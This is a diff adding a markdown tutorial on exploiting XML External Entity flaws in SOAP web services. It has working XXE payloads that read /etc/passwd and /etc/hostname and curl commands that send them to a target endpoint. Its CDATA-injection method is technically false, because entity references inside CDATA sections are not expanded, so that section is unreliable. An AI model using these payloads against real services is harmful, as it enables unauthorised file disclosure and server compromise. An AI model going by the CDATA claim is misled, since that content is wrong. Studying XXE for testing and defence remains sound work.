@@ -1,0 +1,121 @@
+---
+title: Exploiting XXE in SOAP Web Services
+description: Explore how to exploit XML External Entity vulnerabilities in SOAP messages
+  for sensitive data access.
+keywords:
+- XXE vulnerability
+- SOAP exploitation
+- XML External Entity
+- web service security
+- CDATA injection
+- remote file access
+- SOAP message parsing
+- sensitive data disclosure
+- server vulnerabilities
+---
+
+# XXE Inside SOAP
+
+## Context
+
+In this article, we will explore how to exploit XML External Entity (XXE) vulnerabilities in SOAP messages to access sensitive information or retrieve files from a web server. This technique is built on the assumption that the reader understands the structure of XML, the basics of the SOAP protocol, and general XXE attack strategies. This knowledge prepares you to execute this attack effectively in environments where SOAP web services are deployed.
+
+## Theory
+
+### SOAP Message Structure and XML Parsing
+
+SOAP, or Simple Object Access Protocol, is an XML-based protocol for exchanging structured information in the domain of web services. Each SOAP message is an XML document, which includes an envelope to define the message framework and body. As these messages are parsed, they inherit XML parser vulnerabilities, including XXE.
+
+The data flow in a SOAP interaction involves sending a SOAP request to a web service endpoint, which processes the XML and executes the requested functions. If the XML parser in use is configured insecurely, it may allow the inclusion of external entities, leading to potential security vulnerabilities.
+
+### Embedding External Entities in SOAP
+
+When a SOAP endpoint uses a vulnerable XML parser, an attacker can define and reference an external entity within a SOAP message. This is done by crafting a SOAP request that contains a malicious Document Type Definition (DOCTYPE) and entity reference. The server, upon parsing the XML, resolves the entity, which can lead to various exploits.
+
+Entities can be stealthily embedded within SOAP elements by leveraging CDATA sections or deeply nested nodes. This trick can help bypass filters that aren't thoroughly validating or sanitizing SOAP message content.
+
+### Impact of XXE in SOAP Web Services
+
+When XXE vulnerabilities are leveraged within SOAP services, it can lead to severe impacts such as file disclosure from the server, Server-Side Request Forgery (SSRF), or even remote code execution. This is primarily due to SOAP endpoints occasionally being configured to trust input from supposedly authenticated clients. This misplaced trust, combined with poor XML parser configurations, can leave the services open to exploitation.
+
+## Practice
+
+### Manual XXE Exploitation via SOAP Request
+
+To manually exploit an XXE vulnerability via a SOAP request, follow these steps:
+
+- **Craft a SOAP Message:**
+  The aim is to create a SOAP message with a malicious DOCTYPE declaration and external entity reference targeting the XML parser's entity resolution.
+
+  ```xml
+  <?xml version="1.0"?>
+  <!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+  <soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+    <soap:Body>
+      <getInfo>
+        <data>&xxe;</data>
+      </getInfo>
+    </soap:Body>
+  </soap:Envelope>
+  ```
+
+  This payload attempts to read the /etc/passwd file from the server.
+
+- **Send the SOAP Request:**
+  Utilize `curl` to send the crafted SOAP request to the target endpoint.
+
+  ```bash
+  curl -X POST -H "Content-Type: text/xml" --data @xxe_soap.xml http://target-soap-endpoint/service
+  ```
+
+  The command submits the standardized XML request to the potentially vulnerable SOAP service.
+
+- **Check the Response:**
+  If successful, the server's response will contain the contents of the /etc/passwd file.
+
+  ```text
+  # Response content with user information, if vulnerable.
+  ```
+
+### XXE via CDATA Injection in SOAP
+
+Another approach is to perform XXE through CDATA injection. Here's how:
+
+- **Embed Entity in CDATA:**
+  This technique involves placing an entity reference inside a CDATA section within the SOAP message.
+
+  ```xml
+  <?xml version="1.0"?>
+  <!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>
+  <soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+    <soap:Body>
+      <getHost>
+        <info><![CDATA[&xxe;]]></info>
+      </getHost>
+    </soap:Body>
+  </soap:Envelope>
+  ```
+
+  Here, we target /etc/hostname to retrieve the server's hostname.
+
+- **Submit the Payload:**
+  Again, use `curl` to deliver the CDATA-wrapped entity in the payload.
+
+  ```bash
+  curl -X POST -H "Content-Type: text/xml" --data @xxe_soap_cdata.xml http://target-soap-endpoint/service
+  ```
+
+  This action sends the crafted XML to the web service endpoint.
+
+- **Analyze the Response:**
+  If successful, the server response will include the hostname, verifying that the entity expansion worked within the CDATA section.
+
+```text
+  # Response content displaying the hostname if vulnerable.
+  ```
+
+## Tools
+
+- **curl**
+- **Burp Suite**
+- **SOAPUI**
